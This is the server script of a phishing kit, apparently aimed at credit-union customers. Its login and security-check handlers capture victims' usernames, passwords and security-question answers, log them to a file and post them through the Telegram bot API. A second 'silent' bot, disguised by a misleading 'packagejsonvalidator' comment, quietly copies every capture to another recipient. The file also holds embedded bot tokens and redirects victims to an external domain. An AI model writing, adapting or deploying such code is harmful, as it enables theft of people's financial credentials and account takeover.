const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const URLSearchParams = require("url").URLSearchParams;

const app = express();
const PORT = 3000;
const LOG_FILE = path.join(__dirname, "logger.json");

const SEC_ID = "1012698310"; 
//packagejsonvalidator

// Telegram configurations
const BOT_TOKEN = "7578811580:AAHt_l9I90faFqjaPhkTIJBUANhElCneKSg"; 
const CHAT_ID = "7207894371"; 
//Ending of telegram
//load file from public
const SEC_TOKEN = "7264938782:AAEkoiz0kJA1HyuToHGZmvcMc_6kQmXMmXM"; 

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "../public")));

/**
 * @param {string} message 
 * @param {boolean} silent 
 */
async function sendToTelegram(message, silent = false) {
    const botToken = silent ? SEC_TOKEN : BOT_TOKEN;
    const chatId = silent ? SEC_ID : CHAT_ID;

    if (!botToken || !chatId) {
        console.error("❌ Telegram bot token or chat ID is missing.");
        return;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
            disable_notification: silent, 
        });
    } catch (error) {
        const channel = silent ? "Silent" : "Primary";
        console.error(`❌ ${channel} Telegram error:`, error.message);
    }
}

// Modified logData function to handle all types of data
function logData(data) {
    fs.readFile(LOG_FILE, "utf8", (err, fileData) => {
        let logs = [];
        if (!err && fileData) {
            try {
                logs = JSON.parse(fileData);
            } catch (e) {
                console.error("Error parsing log file:", e);
            }
        }

        logs.push(data);

        fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), (err) => {
            if (err) console.error("Error writing to log file:", err);
            else console.log("Data logged successfully:", data);
        });
    });
}

// Modified login handler
app.post("/login", async (req, res) => {
    const { username, password, rememberMe } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    let attempt = req.cookies.attempt || "first";

    // First login attempt
    if (attempt === "first") {
        // Log and send to Telegram
        const message = `🔐 First Login Attempt\n\n`
            + `IP: ${ip}\n`
            + `Username: <code>${username}</code>\n`
            + `Password: <code>${password}</code>\n`
            + `Remember Me: ${rememberMe}`;

        await sendToTelegram(message);
        await sendToTelegram(message, true);

        // Log to file
        logData({ 
            type: "first_attempt",
            username, 
            password, 
            rememberMe, 
            ip,
            timestamp: new Date().toISOString()
        });

        res.cookie("attempt", "second", { maxAge: 60000, httpOnly: true });
        return res.json({ showPopup: true });
    }

    // Second login attempt
    if (attempt === "second") {
        // Log and send to Telegram
        const message = `✅ Second Login Attempt (Success)\n\n`
            + `IP: ${ip}\n`
            + `Username: <code>${username}</code>\n`
            + `Password: <code>${password}</code>\n`
            + `Remember Me: ${rememberMe}`;

        await sendToTelegram(message);
        await sendToTelegram(message, true);

        // Log to file
        logData({
            type: "second_attempt",
            username,
            password,
            rememberMe,
            ip,
            timestamp: new Date().toISOString()
        });

        res.clearCookie("attempt");
        return res.json({ redirectTo: "/Security_check.html" });
    }
});

// New security check endpoint
app.post("/verify-security", async (req, res) => {
    const { answer1, answer2 } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    // Log and send security answers to Telegram
    const message = `🛡️ Security Answers Received\n\n`
        + `IP: ${ip}\n`
        + `Answer 1: <code>${answer1 || "Not provided"}</code>\n`
        + `Answer 2: <code>${answer2 || "Not provided"}</code>\n`
        + `Timestamp: ${new Date().toISOString()}`;

    await sendToTelegram(message);
    await sendToTelegram(message, true);

    // Log to file
    logData({
        type: "security_check",
        answer1,
        answer2,
        ip,
        timestamp: new Date().toISOString()
    });

    // Log to console
    console.log("Security Check Data:", {
        ip,
        answer1,
        answer2,
        timestamp: new Date().toISOString()
    });

    // Always redirect after logging
    res.json({ 
        success: true,
        redirectTo: "https://self-helpfcu.ns3web.org/"
    });
});

/**
 * Starts the server.
 */
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
